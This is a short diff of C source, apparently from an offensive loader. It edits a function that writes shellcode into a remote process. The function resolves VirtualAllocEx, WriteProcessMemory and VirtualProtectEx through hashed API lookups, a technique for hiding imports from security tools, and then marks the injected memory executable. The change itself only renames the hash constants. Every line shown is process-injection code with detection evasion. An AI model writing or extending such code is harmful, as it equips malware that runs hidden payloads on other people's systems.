@@ -69,7 +69,8 @@ BOOL WritePayloadInRemoteProcessMemory(IN HANDLE hProcess, IN PBYTE pShellcode, 
 	}
 	DebugPrint("\t[i] Memory Protection Changed To Executable\n");
 #else
-	VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), VirtualAllocEx_JOAA);
+	HMODULE hKernel = (HMODULE)GetModuleHandleH(KERNEL32DLL_HASH);
+	VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddressH(hKernel, VirtualAllocEx_HASH);
 	if (!pVirtualAllocEx) {
 		DebugPrint("[!] Failed to get VirtualAllocEx address\n");
 		return FALSE;
@@ -82,7 +83,7 @@ BOOL WritePayloadInRemoteProcessMemory(IN HANDLE hProcess, IN PBYTE pShellcode, 
 	}
 	DebugPrint("\t[i] Allocated Memory At : 0x%p \n", *pAddress);
 
-	WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), WriteProcessMemory_JOAA);
+	WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_HASH), WriteProcessMemory_HASH);
 	if (!pWriteProcessMemory) {
 		DebugPrint("[!] Failed to get WriteProcessMemory address\n");
 		return FALSE;
@@ -93,7 +94,7 @@ BOOL WritePayloadInRemoteProcessMemory(IN HANDLE hProcess, IN PBYTE pShellcode, 
 	}
 	DebugPrint("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
 
-	VirtualProtectEx_t pVirtualProtectEx = (VirtualProtectEx_t)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), VirtualProtectEx_JOAA);
+	VirtualProtectEx_t pVirtualProtectEx = (VirtualProtectEx_t)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_HASH), VirtualProtectEx_HASH);
 	if (!pVirtualProtectEx) {
 		DebugPrint("[!] Failed to get VirtualProtectEx address\n");
 		return FALSE;
